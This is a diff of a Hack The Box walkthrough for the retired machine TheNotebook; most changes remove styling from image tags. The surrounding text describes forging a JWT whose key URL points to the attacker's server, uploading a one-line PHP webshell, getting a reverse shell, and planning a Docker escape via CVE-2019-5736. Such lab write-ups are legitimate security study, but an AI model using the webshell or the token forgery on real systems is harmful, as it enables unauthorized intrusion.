@@ -16,12 +16,12 @@ title: 'Walktrough: HTB TheNotebook'
 
 Hello guys!
 
-This week's machine will be **TheNotebook**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [mostwanted002](https://app.hackthebox.eu/users/120514).<!--more-->
+This week's machine will be **TheNotebook**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [mostwanted002](https://app.hackthebox.eu/users/120514). [more]
 
-:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
-{: .notice--info}
+:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they're retired.
 
-![HTB TheNotebook](https://i.imgur.com/DSrrFJP.png){: .align-center}
+
+![HTB TheNotebook](https://i.imgur.com/DSrrFJP.png)
 
 This box was a very interesting one, where I had the opportunity to learn more about JWT Tokens in the path for initial access and then more docker escaping techniques abusing capabilities so I could get root.
 
@@ -58,7 +58,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds
 
 Accessing the page, noticed that is a simple HTTP application, which uses the default [Bootstrap](https://getbootstrap.com/) and no sign of a CMS like WordPress or other known application.
 
-![HTB TheNotebook - 80/TCP](https://i.imgur.com/kJx4QaU.png){: .align-center}
+![HTB TheNotebook - 80/TCP](https://i.imgur.com/kJx4QaU.png)
 
 The guessing was confirmed during `whatweb` execution, which listed only the two known components, as well as the webserver it is running on which is an *Nginx*.
 
@@ -100,11 +100,11 @@ As I haven't found anything specific, decided to poke a little bit with this app
 
 Started by creating an account, clicking on the *Register* link where some basic information was requested as the image below, and resulted in the account creation without any further problem.
 
-![HTB TheNotebook - SignUp](https://i.imgur.com/e49Cij7.png){: .align-center}
+![HTB TheNotebook - SignUp](https://i.imgur.com/e49Cij7.png)
 
 After being created, was redirected to a logged page where I was able to create some notes but interacting with these resources didn't seem that they could be exploited, unless the app would be vulnerable by some kind of **SSTI** (Server-Side Template Injection) once these notes are shown in the page.
 
-![HTB TheNotebook - Logged User](https://i.imgur.com/hPKhMaT.png){: .align-center}
+![HTB TheNotebook - Logged User](https://i.imgur.com/hPKhMaT.png)
 
 Inspecting the requests made so far in Burp since the account creation, nothing interesting was found in the request that could be tampered with to grant us a privileged account but his response is interesting. In this response, we receive a `Set-Cookie` for an object named `auth`, which contained something that resembled a **Token JWT**.
 
@@ -210,11 +210,11 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMTY6NzA3MC9w
 python3 -m http.server 7070Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...10.10.10.230 - - [10/Jun/2021 18:45:24] "GET /privKey.key HTTP/1.1" 200 -
 ```
 
-![HTB TheNotebook - Admin Panel](https://i.imgur.com/NrGXJx9.png){: .align-center}
+![HTB TheNotebook - Admin Panel](https://i.imgur.com/NrGXJx9.png)
 
 - Analyzing what we can do next with the permissions we have from an administrator perspective, we can see two options: list existing notes and upload a file.
 
-![HTB TheNotebook - Admin Options](https://i.imgur.com/fSYkzLZ.png){: .align-center}
+![HTB TheNotebook - Admin Options](https://i.imgur.com/fSYkzLZ.png)
 
 - Reviewing the content of existing notes, we were able to see all notes in the app, as the table below. Pay attention to the notes from **admin** which mentions an existing backup in the server as well as the **ability to execute PHP files in the server**:
 
@@ -229,17 +229,17 @@ Once we could possibly upload and run PHP files, decided to make a test, followi
 
 - Accessing the *File Upload* we have a simple page to post our files, where we're going to inspect the requests using burp.
 
-  ![HTB TheNotebook - File Upload](https://i.imgur.com/fgI2wmr.png){: .align-center}
+  ![HTB TheNotebook - File Upload](https://i.imgur.com/fgI2wmr.png)
 
   - Creating a simple webshell with the content `<?php system($_GET['cmd']);?>`, made its upload and didn't received any warning or block during the action.
 
   - After uploading it, the file was listed on the page, and hitting the *View* butting, we were redirected to the path where the file was, allowing us to see the rendered content.
 
-  ![HTB TheNotebook - Uploaded Files](https://i.imgur.com/aCdIwnN.png){: .align-center}
+  ![HTB TheNotebook - Uploaded Files](https://i.imgur.com/aCdIwnN.png)
 
   - Adding a simple query string at its end, as expected by our simple web shell, to run the id command (`cmd=id`) and we could confirm that we have code execution in the server :smiley:
 
-  ![HTB TheNotebook - Simple WebShell](https://i.imgur.com/eSH3rQY.png){: .align-center}
+  ![HTB TheNotebook - Simple WebShell](https://i.imgur.com/eSH3rQY.png)
 
   - To get a reverse shell, configured a listener and then sent another payload, this time to get a TCP connection from the server, which worked as expected :smile:
 
@@ -367,11 +367,11 @@ Searching for some information, found the repo [stealthcopter/deepce: Docker Enu
 
 Executing it in the container, noticed that we could have a chance on doing it as there were capabilities (in red) that could allow us to read and write files in the host, but using the options in the tool didn't allow me to achieve the expected outcome.
 
-![HTB TheNotebook - deepce output](https://i.imgur.com/0L7480D.png){: .align-center}
+![HTB TheNotebook - deepce output](https://i.imgur.com/0L7480D.png)
 
 As I haven't found anything in the files, decided to search for specific vulnerabilities that could abuse capabilities like the ones we have found, where I found about CVE-2019-5736 while browsing for docker vulns in [CVE Details](https://www.cvedetails.com/). This vuln represents exactly the type of abuse we need based on our situation and, due to its high CVSS score (9.3) probably there is a ready exploit to be used.
 
-![CVE Details - CVE-2019-5736](https://i.imgur.com/CqvPKK3.png){: .align-center}
+![CVE Details - CVE-2019-5736](https://i.imgur.com/CqvPKK3.png)
 
 Searching for exploits I came across the repo [Frichetten/CVE-2019-5736-PoC: PoC for CVE-2019-5736 (github.com)](https://github.com/Frichetten/CVE-2019-5736-PoC) which had a PoC written in Golang that supposedly would attend to our scenario, while other PoCs found required us to be able to run other containers (`docker run`) in the host, not covered by our sudo privileges.
 
